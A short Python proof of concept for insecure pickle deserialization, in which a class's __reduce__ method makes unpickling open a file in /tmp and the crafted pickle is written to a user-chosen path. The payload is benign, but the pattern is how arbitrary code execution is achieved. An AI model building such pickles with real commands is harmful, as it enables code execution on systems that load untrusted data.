# PoC
# insecure Deserialization 
# how is it vulnerable? 
# The Skid class implements the __reduce__ method, which allows an attacker to execute arbitrary code during deserialization
import _pickle as skid
import os 

class Skid:
  def __reduce__(self):
      filename = '/tmp/skid'
      return (open, (filename, 'a'), ())  
variable = ["skid", "skid2", "skid3"]
se_data = skid.dumps(list(variable))
print(se_data)
de_data = skid.loads(se_data)
shellcode = skid.dumps(Skid())
input = input("filename / path?> ")
with open(input, 'wb') as file_object:
  file_object.write(shellcode)```
